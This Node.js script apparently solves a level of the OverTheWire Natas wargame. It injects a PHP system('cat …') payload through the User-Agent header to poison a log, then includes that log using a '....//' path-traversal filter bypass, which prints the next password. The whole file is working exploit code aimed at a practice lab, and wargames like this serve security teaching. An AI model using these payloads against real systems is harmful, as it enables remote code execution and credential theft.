const http = require("http");
const fs = require("fs");
const querystring = require("querystring");

// Creds
const init = 24;
const user = "natas" + (init + 1);
const pass = fs.readFileSync("../../../etc/otw/natas.pass", "utf8").split("\n")[
  init
].trim();

// Conf
const auth = Buffer.from(`${user}:${pass}`).toString("base64");
const opts = {
  hostname: `${user}.natas.labs.overthewire.org`,
  path: "/",
  headers: {
    Authorization: `Basic ${auth}`,
  },
};

// Get
const getPhpSessId = () => {
  return new Promise((resolve, reject) => {
    const get = http.get(opts, (res) => {
      const cookies = res.headers["set-cookie"];

      if (cookies) {
        const phpsessid = cookies[0].split(";")[0].split("=")[1];
        resolve(phpsessid);
      } else {
        reject(new Error("No cookies recieved."));
      }
    });
    get.on("error", (e) => console.error("Error:", e.message));
    get.end();
  });
};

// Post
getPhpSessId()
  .then((phpsessid) => {
    opts.method = "POST";
    opts.headers["Cookie"] = "PHPSESSID=" + phpsessid;
    opts.headers["User-Agent"] =
      "<?php system('cat /etc/natas_webpass/natas26'); ?>";
    opts.headers["Content-Type"] = "application/x-www-form-urlencoded";

    const post = http.request(opts, (res) => {
      res.on("data", (chunk) => process.stdout.write(chunk));
    });

    post.write(
      querystring.stringify({
        lang: `....//....//....//....//....//var/www/natas/natas25/logs/natas25_${phpsessid}.log`,
      }),
    );

    post.on("error", (e) => console.error("Error: ", e.message));
    post.end();
  })
  .catch((err) => console.error("Error: ", err.message));
